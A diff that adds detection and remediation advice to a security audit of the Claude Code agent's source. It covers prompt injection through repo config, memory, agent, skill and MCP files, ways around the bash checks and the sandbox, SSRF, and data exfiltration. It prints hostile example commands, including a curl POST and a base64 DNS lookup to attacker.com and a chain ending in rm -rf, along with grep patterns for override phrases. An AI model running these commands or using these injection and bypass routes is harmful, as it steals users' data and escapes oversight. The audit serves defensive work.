@@ -1,6 +1,6 @@
 # Security Vulnerabilities & Attack Surface Analysis
 
-> A comprehensive audit of security weaknesses, exploit vectors, and attack surfaces discovered in the Claude Code source. Organized by severity and attack category.
+> A comprehensive audit of security weaknesses, exploit vectors, and attack surfaces discovered in the Claude Code source. Each vulnerability includes detection methods and remediation guidance.
 
 ---
 
@@ -22,6 +22,17 @@
 
 **Mitigation gap**: There is no sanitization or sandboxing of CLAUDE.md content. The trust dialog only covers initial project trust, not ongoing CLAUDE.md changes.
 
+**Detection**:
+- Review `.claude/CLAUDE.md` and `CLAUDE.md` in any cloned repo before opening with Claude Code
+- `grep -rn "ignore previous\|override\|exfiltrate\|send to\|curl\|fetch(" .claude/ CLAUDE.md 2>/dev/null`
+- Monitor for CLAUDE.md files that contain URLs, tool invocations, or override language
+
+**Remediation**:
+- Always inspect `.claude/` directory contents before trusting a new project
+- Add `.claude/CLAUDE.md` to your review checklist for pull requests
+- Use `git diff` to audit CLAUDE.md changes before pulling
+- Anthropic should: sandbox CLAUDE.md instructions so they cannot override core safety behaviors, add content hashing to detect changes between sessions
+
 ### 1.2 Memory File Injection
 
 **Attack**: A malicious repo includes `.claude/memory/` files or a `MEMORY.md` with instructions that persist across sessions.
@@ -32,18 +43,33 @@
 
 **Files**: `src/memdir/memdir.ts`, `src/memdir/memoryScan.ts`
 
+**Detection**:
+- `find .claude/memory -name "*.md" -exec grep -l "ignore\|override\|exfiltrate" {} \;`
+- Check if `.claude/memory/` exists in a repo you didn't create yourself
+- Review `MEMORY.md` for entries you don't recognize
+
+**Remediation**:
+- Add `.claude/memory/` to `.gitignore` so memory files can't be committed to repos
+- Never accept PRs that include `.claude/memory/` files
+- Periodically review your memory directory: `ls -la ~/.claude/projects/*/memory/`
+
 ### 1.3 Custom Agent Definition Injection
 
 **Attack**: A malicious repo includes `.claude/agents/*.md` files with crafted agent definitions.
 
 **Why it works**: `loadAgentsDir.ts` loads agent definitions from the project directory. Agent definitions include a full system prompt and tool configuration.
 
-**Impact**: 
-- Define agents with permissive tool access
-- Inject custom system prompts that override safety
-- Create agents that exfiltrate data
+**Impact**: Define agents with permissive tool access, inject custom system prompts, create data-exfiltrating agents.
 
 **Files**: `src/tools/AgentTool/loadAgentsDir.ts`
+
+**Detection**:
+- `find .claude/agents -name "*.md" 2>/dev/null` -- check if any exist in cloned repos
+- Inspect frontmatter for `tools: ['*']`, `permissionMode: bypass`, or `mcpServers:` pointing to external URLs
+
+**Remediation**:
+- Review all `.claude/agents/*.md` files before trusting a project
+- Anthropic should: require explicit approval for project-defined agents, restrict tool access in project agents
 
 ### 1.4 Skill File Injection
 
@@ -54,6 +80,14 @@
 **Impact**: Custom prompt injection triggered by specific slash commands.
 
 **Files**: `src/skills/loadSkillsDir.ts`
+
+**Detection**:
+- `find .claude/skills -name "*.md" 2>/dev/null`
+- Look for shell execution syntax (`!` code blocks) inside skill files
+
+**Remediation**:
+- Treat `.claude/skills/` with the same suspicion as executable scripts
+- Review skill content before invoking any project-defined `/` commands
 
 ---
 
@@ -66,7 +100,6 @@
 **Why it works**: `bashPermissions.ts` caps security analysis at `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50`. Beyond that limit, remaining subcommands are **not analyzed**.
 
 ```bash
-# First 50 commands are safe reads, command 51+ does something dangerous
 cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 ```
 
@@ -74,9 +107,17 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Files**: `src/tools/BashTool/bashPermissions.ts`
 
+**Detection**:
+- Count the number of `&&`, `||`, `;`, `|` operators in any command the model generates
+- Alert if a command has more than 40 subcommands (approaching the limit)
+
+**Remediation**:
+- Anthropic should: remove the cap and analyze all subcommands, or reject commands exceeding the limit entirely rather than partially analyzing them
+- Users: be suspicious of any model-generated command with many chained operations
+
 ### 2.2 Sandbox Exclusion List
 
-**Attack**: Use commands that are explicitly excluded from sandbox.
+**Attack**: Use commands that are explicitly excluded from sandbox, or set `dangerouslyDisableSandbox: true`.
 
 **Why it works**: `shouldUseSandbox.ts` maintains an exclusion list. When `dangerouslyDisableSandbox: true` is set by the model, the entire macOS Seatbelt sandbox is bypassed for that command.
 
@@ -84,50 +125,79 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Files**: `src/tools/BashTool/shouldUseSandbox.ts`
 
+**Detection**:
+- Search tool call history for `dangerouslyDisableSandbox: true`
+- Monitor which commands run outside the sandbox
+
+**Remediation**:
+- Never approve `dangerouslyDisableSandbox` without understanding why
+- Anthropic should: log all sandbox bypasses, require separate user approval for sandbox disabling
+
 ### 2.3 Read-Only Classification Errors
 
 **Attack**: Use commands classified as "read-only" that can actually modify state.
 
-**Why it works**: `readOnlyValidation.ts` maintains allowlists of "safe" commands. Some edge cases:
-
-- `git config --get` is allowed, but `git config --get` with certain flags can trigger side effects
-- `xargs` is allowed in read-only context but can pipe to write commands
-- `jq` with certain flags can write files
+**Why it works**: `readOnlyValidation.ts` maintains allowlists of "safe" commands. Edge cases include `xargs` piping to write commands, `jq` with write flags, `git config --get` side effects.
 
 **Impact**: Commands auto-approved as read-only that modify the filesystem.
 
 **Files**: `src/tools/BashTool/readOnlyValidation.ts`
 
+**Detection**:
+- Audit auto-approved commands for output redirection (`>`, `>>`, `-o`, `--output`)
+- Check for `xargs` piping to non-read commands
+
+**Remediation**:
+- Anthropic should: validate flags per-command, not just command names; blocklist known write flags like `-o`, `--output`, `-w` for commands in the read-only allowlist
+
 ### 2.4 Unicode/Encoding Bypasses
 
 **Attack**: Use Unicode lookalike characters or encoding tricks to evade security checks.
 
-**Why it works**: While `bashSecurity.ts` checks for some Unicode patterns (check IDs 1-22), the checks may not cover all Unicode normalization forms. Homograph attacks using visually similar characters can evade string matching.
+**Why it works**: While `bashSecurity.ts` checks for some Unicode patterns (check IDs 1-22), the checks may not cover all Unicode normalization forms.
 
 **Impact**: Bypass destructive command detection or path validation.
 
 **Files**: `src/tools/BashTool/bashSecurity.ts`
 
+**Detection**:
+- Check for non-ASCII characters in commands: `echo "$cmd" | grep -P '[^\x00-\x7F]'`
+- Normalize Unicode before security checks
+
+**Remediation**:
+- Anthropic should: apply Unicode NFC normalization before all security checks, reject commands containing non-ASCII characters in security-sensitive positions
+
 ### 2.5 Environment Variable Expansion
 
 **Attack**: Inject commands via environment variable expansion in arguments.
 
-**Why it works**: Bash expands `$VARIABLE` and `${VARIABLE}` in command arguments. If the security check analyzes the literal string but Bash expands variables at runtime, the executed command differs from what was validated.
+**Why it works**: Security checks analyze the literal string but Bash expands `$VARIABLE` at runtime, so the executed command differs from what was validated.
 
 **Impact**: Command injection via environment variable manipulation.
 
-**Files**: `src/tools/BashTool/bashSecurity.ts` (checks exist but may have gaps)
+**Files**: `src/tools/BashTool/bashSecurity.ts`
+
+**Detection**:
+- Flag commands containing `${`, `$()`, or backticks in arguments
+- Compare literal command string vs. what would execute after expansion
+
+**Remediation**:
+- Anthropic should: expand known environment variables before validation where safe, or reject commands with unresolvable variable references in security-critical contexts
 
 ### 2.6 Sed Injection Edge Cases
 
 **Attack**: Craft sed commands that bypass the strict allowlist.
 
-**Why it works**: `sedValidation.ts` validates sed patterns against allowlists, but:
-- Complex sed scripts with multiple commands separated by `;` may parse differently
-- The `-e` flag allows multiple expressions, and validation may not cover all combinations
-- Backslash escaping in sed patterns can confuse the parser
+**Why it works**: `sedValidation.ts` has gaps: complex sed scripts with `;` separators, the `-e` flag for multiple expressions, and backslash escaping can confuse the parser.
 
 **Files**: `src/tools/BashTool/sedValidation.ts`
+
+**Detection**:
+- Flag sed commands with `-e` flag, multiple expressions, or non-standard delimiters
+- Check for `w` (write) or `e` (execute) commands in sed scripts
+
+**Remediation**:
+- Anthropic should: parse sed expressions with a proper grammar rather than regex matching; support all POSIX delimiters in the validator
 
 ---
 
@@ -139,32 +209,53 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Why it works**: MCP tool results are passed directly to the model as tool_result content. The model processes this content and may follow instructions embedded in it.
 
-**Impact**: 
-- Instruct the model to call other tools with attacker-controlled inputs
-- Exfiltrate sensitive file contents via subsequent MCP tool calls
-- Chain tool calls to achieve arbitrary actions
+**Impact**: Instruct the model to call other tools, exfiltrate file contents, chain tool calls.
 
 **Files**: `src/tools/MCPTool/MCPTool.ts`
 
+**Detection**:
+- Monitor MCP tool results for instruction-like content ("please", "you should", "ignore", "override")
+- Log all MCP tool call inputs and outputs
+- Compare expected result format against actual result
+
+**Remediation**:
+- Anthropic should: tag MCP tool results with a `<system-reminder>` noting they are from external sources; apply prompt injection detection to MCP results
+- Users: only connect MCP servers you trust; review MCP server source code
+
 ### 3.2 MCP Environment Variable Leakage
 
-**Attack**: MCP server configurations support environment variable expansion in commands, args, and env fields.
+**Attack**: MCP server configurations reference environment variables like `$AWS_SECRET_ACCESS_KEY`, passing them to attacker-controlled servers.
 
-**Why it works**: `expandEnvVarsInString()` expands `${VAR}` syntax. While there's a `restrictedVariables` allowlist, the expansion happens for server configs loaded from project-level `.claude/settings.json`.
+**Why it works**: `expandEnvVarsInString()` expands `${VAR}` syntax in configs from project-level `.claude/settings.json`.
 
-**Impact**: A malicious repo's MCP config could reference `$AWS_SECRET_ACCESS_KEY`, `$GITHUB_TOKEN`, or other secrets, passing them to an attacker-controlled MCP server.
+**Impact**: Secret credentials sent to attacker's MCP server endpoint.
 
 **Files**: `src/services/mcp/` (config loading, env expansion)
 
+**Detection**:
+- Audit `.claude/settings.json` for MCP configs referencing `$` variables: `grep -n '\$' .claude/settings.json`
+- Check if MCP server URLs in project configs point to unexpected domains
+
+**Remediation**:
+- Anthropic should: never expand environment variables in project-level MCP configs; restrict expansion to user-level configs only; add an explicit allowlist of expandable variables
+- Users: review all MCP configurations in `.claude/settings.json` before trusting a project
+
 ### 3.3 MCP Server Tool Name Collision
 
-**Attack**: A malicious MCP server registers tools with names that collide with built-in tools.
+**Attack**: A malicious MCP server registers tools with names crafted to create confusion.
 
-**Why it works**: Tool names are prefixed with `mcp__<server>__<tool>`, but if a server name is crafted carefully, it could create confusion in tool routing.
+**Why it works**: Tool names are prefixed with `mcp__<server>__<tool>`, but creative server naming could cause confusion.
 
-**Impact**: Tool call routing manipulation, potential shadow of built-in tools.
+**Impact**: Tool call routing manipulation.
 
 **Files**: `src/tools/MCPTool/MCPTool.ts`, `src/tools.ts`
+
+**Detection**:
+- List all registered tools with `/mcp` and check for suspicious names
+- Alert on MCP tools whose names resemble built-in tools
+
+**Remediation**:
+- Anthropic should: enforce strict naming validation; reject server names containing double underscores or built-in tool name substrings
 
 ---
 
@@ -172,43 +263,74 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 ### 4.1 JWT Payload Without Signature Verification
 
-**Attack**: Craft or modify JWT payloads.
+**Attack**: Craft or modify JWT payloads since `decodeJwtPayload()` parses without verifying the signature.
 
-**Why it works**: `jwtUtils.ts` includes `decodeJwtPayload()` which "parses payload without verifying signature." While this may be intentional for client-side display, any logic that relies on the decoded payload without server-side verification is vulnerable.
+**Why it works**: `jwtUtils.ts` decodes JWT payloads without signature, issuer, or audience validation.
 
 **Impact**: Token claims (expiry, permissions) could be spoofed client-side.
 
 **Files**: `src/bridge/jwtUtils.ts`
 
+**Detection**:
+- Audit all callers of `decodeJwtPayload()` to verify they don't use the result for security decisions without server-side validation
+- Check if `decodeJwtExpiry()` is used for token gating
+
+**Remediation**:
+- Anthropic should: implement JWT signature verification using `jose` or similar library; validate issuer and audience claims; use server-side token validation for all security decisions
+- Mark `decodeJwtPayload()` as explicitly unsafe with comments and types
+
 ### 4.2 Session Token in URLs and Logs
 
-**Attack**: Extract session tokens from URLs, error messages, or log output.
+**Attack**: Extract session tokens from URLs, error messages, or debug log output.
 
-**Why it works**: Session IDs and tokens appear in URLs (`/v1/code/sessions/{id}`), bridge configs, and potentially in error messages or debug logs.
+**Why it works**: Session IDs and tokens appear in URLs (`/v1/code/sessions/{id}`), bridge configs, and debug output.
 
 **Impact**: Session hijacking if tokens are leaked via logs, browser history, or proxy logs.
 
 **Files**: `src/bridge/bridgeConfig.ts`, `src/bridge/debugUtils.ts`
 
+**Detection**:
+- `grep -rn 'sessionId\|accessToken\|session_token' ~/.claude/logs/ 2>/dev/null`
+- Check proxy logs for session tokens in URLs
+
+**Remediation**:
+- Anthropic should: redact tokens in all log output; use token hashes for log correlation; rotate session tokens frequently
+- Users: don't share debug logs without redacting tokens
+
 ### 4.3 Trusted Device Token Theft
 
 **Attack**: Extract the trusted device token from the keychain/credential store.
 
-**Why it works**: `trustedDevice.ts` stores tokens in the platform keychain. On macOS, other processes running as the same user can potentially access keychain items.
+**Why it works**: `trustedDevice.ts` stores tokens in the platform keychain. Other processes running as the same user can access keychain items.
 
 **Impact**: Device impersonation, bypassing device-trust requirements.
 
 **Files**: `src/bridge/trustedDevice.ts`, `src/utils/secureStorage/`
 
+**Detection**:
+- Monitor keychain access events (macOS: `log show --predicate 'subsystem == "com.apple.securityd"'`)
+- Check for unexpected processes accessing Claude Code keychain items
+
+**Remediation**:
+- Anthropic should: use application-specific keychain access groups; bind device tokens to hardware attestation where available
+- Users: lock your machine when away; use separate macOS accounts for untrusted work
+
 ### 4.4 OAuth Redirect URI Manipulation
 
-**Attack**: Manipulate the OAuth redirect URI during MCP authentication flows.
+**Attack**: Race condition on the OAuth callback port to intercept auth codes.
 
-**Why it works**: OAuth flows spawn a local callback server on a random port. If an attacker can predict or race the port, they could intercept the auth code.
+**Why it works**: OAuth flows spawn a local callback server on a random port. If an attacker can predict or race the port, they intercept the auth code.
 
 **Impact**: OAuth token theft during MCP server authentication.
 
-**Files**: `src/services/mcp/auth.ts` (referenced in MCP auth flow), `src/services/oauth/`
+**Files**: `src/services/mcp/auth.ts`, `src/services/oauth/`
+
+**Detection**:
+- Monitor for unexpected localhost listeners during OAuth flows: `lsof -i -P | grep LISTEN`
+- Check for multiple processes binding to the same port range
+
+**Remediation**:
+- Anthropic should: use PKCE (Proof Key for Code Exchange) for all OAuth flows; bind to loopback-only with OS-assigned random ports; verify the state parameter is cryptographically strong
 
 ---
 
@@ -220,36 +342,59 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Why it works**: Project-level settings are loaded and merged with user settings. Permission rules from project settings can add `allow` rules for dangerous operations.
 
-**Impact**:
-- Auto-approve destructive commands
-- Add permission rules that bypass safety checks
-- Configure MCP servers that exfiltrate data
+**Impact**: Auto-approve destructive commands, bypass safety checks, configure exfiltrating MCP servers.
 
 **Files**: `src/utils/config.ts`, `src/utils/settings/settings.ts`
 
-**Partial mitigation**: The `isDangerousBashPermission()` function in `permissionSetup.ts` detects overly broad rules (wildcards, interpreter prefixes), but this is advisory, not blocking.
+**Partial mitigation**: `isDangerousBashPermission()` in `permissionSetup.ts` detects overly broad rules, but this is advisory.
+
+**Detection**:
+- `cat .claude/settings.json 2>/dev/null` -- review before trusting any project
+- Look for `"allow"` rules, `mcpServers`, `hooks`, and `enabledPlugins` keys
+- `grep -n "allow\|Bash\|hook\|mcp" .claude/settings.json 2>/dev/null`
+
+**Remediation**:
+- Anthropic should: show a security dialog when project settings contain permission rules, hooks, or MCP configs; never auto-apply dangerous rules from project settings
+- Users: audit `.claude/settings.json` in every new repo
 
 ### 5.2 Hook Injection
 
 **Attack**: A malicious repo includes `.claude/settings.json` with hooks that execute arbitrary shell commands.
 
-**Why it works**: Hooks are shell commands that execute in response to events (tool calls, session start, etc.). Hook configuration in project settings can specify commands that run automatically.
+**Why it works**: Hooks are shell commands that execute in response to events. No validation of shell metacharacters (`$()`, backticks, `&&`, `;`).
 
 **Impact**: Arbitrary code execution triggered by normal Claude Code usage.
 
 **Files**: `src/schemas/hooks.ts`, `src/utils/hooks/`
 
+**Detection**:
+- `grep -n "hook\|command" .claude/settings.json 2>/dev/null`
+- Review hook commands for shell injection patterns: `$(`, `` ` ``, `&&`, `||`, `;`, `|`
+
+**Remediation**:
+- Anthropic should: validate hook commands with a shell parser; reject commands containing injection patterns; require explicit user approval for project-defined hooks; apply the same `restrictedVariables` allowlist used for HTTP hooks
+- Users: never trust a project with hooks defined in `.claude/settings.json` without reviewing them
+
 ### 5.3 MCP Server Configuration Injection
 
-**Attack**: A malicious repo includes `.claude/settings.json` configuring MCP servers that point to attacker-controlled endpoints.
+**Attack**: A malicious repo includes `.claude/settings.json` configuring MCP servers pointing to attacker endpoints.
 
-**Why it works**: Project-level MCP server configs are loaded during startup. An attacker's server receives all MCP tool calls and can return crafted responses.
+**Why it works**: Project-level MCP server configs are loaded during startup. An attacker's server receives all MCP tool calls.
 
 **Impact**: Tool call interception, data exfiltration, prompt injection via tool results.
 
-**Files**: `src/services/mcp/types.ts`, `src/services/mcp/` (config loading)
+**Files**: `src/services/mcp/types.ts`, `src/services/mcp/`
 
-**Partial mitigation**: `mcpServerApproval.tsx` requires first-time approval for project MCP servers, but the approval UI may not clearly communicate the risk.
+**Partial mitigation**: `mcpServerApproval.tsx` requires first-time approval.
+
+**Detection**:
+- `grep -n "mcpServers" .claude/settings.json 2>/dev/null`
+- Check if MCP server URLs point to unexpected domains
+- `grep -rn "url.*http" .claude/settings.json 2>/dev/null`
+
+**Remediation**:
+- Anthropic should: clearly display the server URL and warn about data exposure in the approval dialog; never auto-approve project MCP servers; show all tool calls going to project-defined servers
+- Users: treat any project-defined MCP server as untrusted
 
 ---
 
@@ -259,31 +404,54 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Attack**: Create symlinks within the project directory pointing to sensitive files outside it.
 
-**Why it works**: Path validation in `pathValidation.ts` checks the literal path string, but may not resolve symlinks before validation. If a symlink `./innocent.txt -> /etc/shadow` exists, writing to `./innocent.txt` writes to `/etc/shadow`.
+**Why it works**: Path validation checks the literal path string but may not resolve symlinks. Writing to `./innocent.txt -> /etc/shadow` writes to `/etc/shadow`.
 
 **Impact**: Read or write arbitrary files outside the project directory.
 
 **Files**: `src/tools/BashTool/pathValidation.ts`, `src/tools/FileWriteTool/FileWriteTool.ts`
 
+**Detection**:
+- `find . -type l -exec ls -la {} \;` -- find all symlinks in the project
+- Check if any symlinks point outside the project directory
+- `find . -type l -exec readlink -f {} \; | grep -v "^$(pwd)"`
+
+**Remediation**:
+- Anthropic should: add `lstat()` check before all file writes; reject writes to symlinks or resolve them and re-validate the target path; use `O_NOFOLLOW` equivalent
+- Users: audit symlinks in untrusted repos before opening with Claude Code
+
 ### 6.2 Path Traversal via Encoded Characters
 
 **Attack**: Use encoded path components (`..%2F`, `..%00/`) to traverse outside project.
 
-**Why it works**: If path validation checks the raw string but the filesystem interprets encoded characters, traversal is possible.
+**Why it works**: If path validation checks the raw string but the filesystem interprets encoded characters.
 
 **Impact**: File access outside the project boundary.
 
 **Files**: `src/tools/BashTool/pathValidation.ts`, `src/tools/FileEditTool/FileEditTool.ts`
 
+**Detection**:
+- Check for `%` in file paths (URL encoding in filesystem paths is suspicious)
+- Normalize paths before validation: `path.resolve()` then check prefix
+
+**Remediation**:
+- Anthropic should: canonicalize all paths with `path.resolve()` and `fs.realpath()` before validation; reject paths containing `%`, null bytes, or non-UTF8 sequences
+
 ### 6.3 Race Condition (TOCTOU)
 
-**Attack**: Replace a file between the time it's validated and the time it's read/written.
+**Attack**: Replace a file between validation time and write time (e.g., swap with a symlink).
 
-**Why it works**: The `FileEditTool` requires reading a file before editing. Between the read (which populates the file state cache) and the edit, the file could be replaced with a symlink.
+**Why it works**: Between the read (file state cache) and the edit, the file could be replaced.
 
 **Impact**: Edit operations applied to unintended files.
 
 **Files**: `src/tools/FileEditTool/FileEditTool.ts`, `src/utils/fileStateCache.ts`
+
+**Detection**:
+- Monitor filesystem events during Claude Code sessions with `fswatch` or `inotifywait`
+- Check for rapid file replacements during tool execution
+
+**Remediation**:
+- Anthropic should: open file handles exclusively during read-validate-write cycle; use `flock()` or `O_EXCL` where possible; re-validate the file identity (inode number) before writing
 
 ---
 
@@ -293,27 +461,36 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Attack**: Use the WebFetch tool to access internal services, cloud metadata endpoints, or localhost.
 
-**Why it works**: `WebFetchTool.ts` fetches URLs provided by the model. The `preapproved.ts` file lists URLs that auto-approve without user consent.
-
-**Potential targets**:
-- `http://169.254.169.254/` (AWS metadata endpoint)
-- `http://metadata.google.internal/` (GCP metadata)
-- `http://localhost:*` (local services)
-- Internal corporate URLs
+**Potential targets**: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP), `http://localhost:*`
 
 **Impact**: Cloud credential theft, internal service access, information disclosure.
 
 **Files**: `src/tools/WebFetchTool/WebFetchTool.ts`, `src/tools/WebFetchTool/preapproved.ts`
 
-**Partial mitigation**: WebFetch requires user approval in default mode. But in bypass mode or with permissive rules, SSRF is possible.
+**Partial mitigation**: WebFetch requires user approval in default mode.
+
+**Detection**:
+- Monitor WebFetch tool calls for private/internal IP ranges: `169.254.x.x`, `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`, `127.x.x.x`, `localhost`
+- Check for metadata endpoint URLs in tool call history
+
+**Remediation**:
+- Anthropic should: add an explicit blocklist for cloud metadata IPs (`169.254.169.254`, `fd00:ec2::254`), link-local addresses, and `localhost`; validate DNS resolution to ensure the resolved IP is not in a private range (DNS rebinding protection)
+- Users: never use bypass mode on cloud instances; review all WebFetch URLs before approving
 
 ### 7.2 Preapproved URL Abuse
 
-**Attack**: Exploit the preapproved URL list to fetch content without user approval.
+**Attack**: Exploit the preapproved URL list to access user-controlled content without approval.
 
-**Why it works**: Certain URLs (documentation sites, package registries) are preapproved. If any preapproved domain hosts user-controlled content, it becomes an exfiltration channel.
+**Why it works**: If any preapproved domain hosts user-controlled content, it becomes an exfiltration or injection channel.
 
 **Files**: `src/tools/WebFetchTool/preapproved.ts`
+
+**Detection**:
+- Review the preapproved URL list for domains that host user content (e.g., GitHub raw, npm registry)
+- Check for URL parameters that could encode exfiltrated data
+
+**Remediation**:
+- Anthropic should: minimize the preapproved list; never preapprove domains that serve user-uploaded content; add URL parameter length limits
 
 ---
 
@@ -323,41 +500,69 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Attack**: A sub-agent gains access to more tools than the parent intended.
 
-**Why it works**: Tool resolution in `resolveAgentTools()` has complex logic with wildcards, allowlists, and denylists. Edge cases in the filtering could allow a custom agent to access tools not intended.
+**Why it works**: Tool resolution in `resolveAgentTools()` has complex logic with wildcards, allowlists, and denylists.
 
 **Impact**: A restricted agent performing unrestricted operations.
 
 **Files**: `src/tools/AgentTool/agentToolUtils.ts`
 
+**Detection**:
+- Compare the parent's intended tool list against what the child actually received
+- Log tool resolution results for each agent spawn
+
+**Remediation**:
+- Anthropic should: use explicit allowlists rather than wildcards as default; log tool set differences between parent and child; add assertions that child tool set is a subset of parent's
+
 ### 8.2 Fork Context Data Leakage
 
 **Attack**: Fork a sub-agent that inherits the full parent conversation, including sensitive data.
 
-**Why it works**: Fork agents inherit the parent's **entire conversation context**, including file contents, tool results, and user messages. If the fork sends this to an MCP server or writes it to a file, sensitive data is leaked.
+**Why it works**: Fork agents inherit the entire conversation context.
 
-**Impact**: Sensitive data from the conversation exposed to sub-agent tools or MCP servers.
+**Impact**: Sensitive data exposed to sub-agent tools or MCP servers.
 
 **Files**: `src/tools/AgentTool/forkSubagent.ts`
+
+**Detection**:
+- Audit fork agent tool calls for data that matches content from the parent conversation
+- Check if fork agents call MCP tools or WebFetch with conversation data
+
+**Remediation**:
+- Anthropic should: allow filtering sensitive content before forking; add context-sensitivity tags that prevent forwarding to external tools; warn when a fork has access to both sensitive data and external communication tools
 
 ### 8.3 Team Mailbox Poisoning
 
 **Attack**: Write malicious messages to a teammate's mailbox directory.
 
-**Why it works**: Team mailboxes are stored at `~/.claude/teams/<team>/mailboxes/<member>/`. If an attacker has write access to the user's home directory, they can inject messages that the teammate agent will process.
+**Why it works**: Mailboxes at `~/.claude/teams/<team>/mailboxes/<member>/` have no sender authentication.
 
-**Impact**: Prompt injection via mailbox messages, causing the teammate to perform attacker-controlled actions.
+**Impact**: Prompt injection via mailbox, causing the teammate to perform attacker-controlled actions.
 
 **Files**: `src/utils/swarm/teamHelpers.ts`
+
+**Detection**:
+- `find ~/.claude/teams/*/mailboxes -name "*.json" -newer /tmp/session_start 2>/dev/null`
+- Check mailbox messages for unexpected senders or content
+
+**Remediation**:
+- Anthropic should: sign mailbox messages with per-agent HMAC; verify sender identity on read; restrict mailbox directory permissions to owner-only
 
 ### 8.4 Worktree Escape
 
 **Attack**: An agent in a git worktree accesses files outside the worktree boundary.
 
-**Why it works**: Worktree isolation relies on the agent respecting its CWD. If the agent runs commands with absolute paths or `cd`s out, the isolation is broken. The worktree notice is advisory, not enforced.
+**Why it works**: Worktree isolation is advisory (via context injection), not enforced at the tool level.
 
 **Impact**: Agent modifying files in the main repo or other worktrees.
 
-**Files**: `src/tools/AgentTool/forkSubagent.ts` (worktree notice)
+**Files**: `src/tools/AgentTool/forkSubagent.ts`
+
+**Detection**:
+- Monitor file operations from worktree agents for paths outside the worktree root
+- Check `git rev-parse --git-common-dir` access patterns
+
+**Remediation**:
+- Anthropic should: enforce worktree CWD at the tool level, not just via prompt; intercept path arguments in FileEdit/FileWrite/Bash tools and validate they're within the worktree; use the sandbox to restrict filesystem access to the worktree directory
 
 ---
 
@@ -365,33 +570,57 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 ### 9.1 Bridge Message Injection
 
-**Attack**: A man-in-the-middle on the WebSocket connection injects messages into the bridge.
+**Attack**: A MitM on the WebSocket injects messages into the bridge.
 
-**Why it works**: Bridge messages are JSON over WebSocket. While TLS protects the connection, a compromised proxy or certificate could allow injection.
+**Why it works**: Bridge messages are JSON over WebSocket. A compromised proxy or certificate allows injection.
 
-**Impact**: Inject tool calls, approve permissions, or manipulate the conversation.
+**Impact**: Inject tool calls, approve permissions, manipulate conversation.
 
 **Files**: `src/bridge/bridgeMessaging.ts`, `src/bridge/inboundMessages.ts`
+
+**Detection**:
+- Monitor for unexpected message UUIDs in the bridge stream
+- Check TLS certificate validity on bridge connections
+- Alert on messages with `type: 'user'` that don't correspond to actual user input
+
+**Remediation**:
+- Anthropic should: implement message signing with per-session HMAC keys; validate message sequence numbers; add mutual TLS for bridge connections
+- Users: don't use Claude Code over untrusted networks without VPN
 
 ### 9.2 Remote Permission Bridge Bypass
 
 **Attack**: Approve permissions remotely without the actual user's consent.
 
-**Why it works**: `remotePermissionBridge.ts` bridges permission requests between local and remote. If the remote session's WebSocket is compromised, permissions can be auto-approved.
+**Why it works**: `remotePermissionBridge.ts` bridges permissions. If the WebSocket is compromised, permissions auto-approve.
 
 **Impact**: Tool calls approved without user knowledge.
 
 **Files**: `src/remote/remotePermissionBridge.ts`
 
+**Detection**:
+- Log all permission approvals with source (local vs. remote)
+- Alert on permissions approved without corresponding UI interaction
+
+**Remediation**:
+- Anthropic should: require explicit user confirmation for permission approvals from remote sessions; add a confirmation PIN or challenge-response for sensitive permissions
+- Users: review the `/permissions` log after remote sessions
+
 ### 9.3 Direct Connect Session Hijacking
 
 **Attack**: Connect to an existing direct connect session without proper authentication.
 
-**Why it works**: `directConnectManager.ts` manages direct connections. The authentication mechanism needs to be robust against session enumeration and unauthorized access.
+**Why it works**: `directConnectManager.ts` lacks server identity validation on WebSocket connections.
 
 **Impact**: Hijack another user's Claude Code session.
 
 **Files**: `src/server/createDirectConnectSession.ts`, `src/server/directConnectManager.ts`
+
+**Detection**:
+- Monitor active direct connect sessions: check for unexpected connections
+- Log client IP addresses for all direct connect sessions
+
+**Remediation**:
+- Anthropic should: implement server certificate validation; use mutual TLS; add session-specific tokens that are not replayable
 
 ---
 
@@ -399,31 +628,35 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 ### 10.1 Via MCP Tool Calls
 
-**Attack**: A compromised prompt causes Claude to send sensitive file contents to an attacker-controlled MCP server via tool calls.
-
 **Path**: Read sensitive file -> call MCP tool with file contents as parameter.
+
+**Detection**: Log all MCP tool call parameters; flag calls containing file contents or credentials.
+
+**Remediation**: Anthropic should apply output filtering to detect and block sensitive data patterns (API keys, private keys, credentials) in MCP tool parameters.
 
 ### 10.2 Via WebFetch
 
-**Attack**: Send data to an external URL via WebFetch tool.
-
 **Path**: Read sensitive file -> WebFetch POST to attacker's server.
+
+**Detection**: Monitor WebFetch POST body sizes; flag requests with large bodies to non-documentation URLs.
+
+**Remediation**: Block WebFetch POST requests in default mode; require explicit user approval for any data-sending HTTP method.
 
 ### 10.3 Via Bash
 
-**Attack**: Use curl/wget to exfiltrate data.
-
 **Path**: Read file -> `curl -X POST https://attacker.com/exfil -d @sensitive_file`
 
-**Mitigation**: All three require user approval in default mode. In bypass mode, they execute freely. The sandbox blocks network access for some commands, but not all.
+**Detection**: Flag `curl`/`wget` commands with POST data referencing local files.
+
+**Remediation**: The sandbox already blocks network for some commands. Extend to all commands that reference local file paths in POST bodies.
 
 ### 10.4 Via DNS
 
-**Attack**: Exfiltrate data encoded in DNS queries.
-
 **Path**: Read file -> `nslookup $(cat /etc/passwd | base64 | head -1).attacker.com`
 
-**Mitigation**: DNS exfiltration is not detected by any security check.
+**Detection**: This is the hardest to detect. Monitor DNS query logs for unusually long subdomains or base64-encoded labels.
+
+**Remediation**: Anthropic should add DNS query monitoring to the sandbox; block DNS queries containing encoded data patterns. Users on sensitive networks should use DNS logging and anomaly detection.
 
 ---
 
@@ -433,17 +666,31 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 **Attack**: Install a plugin that executes arbitrary code.
 
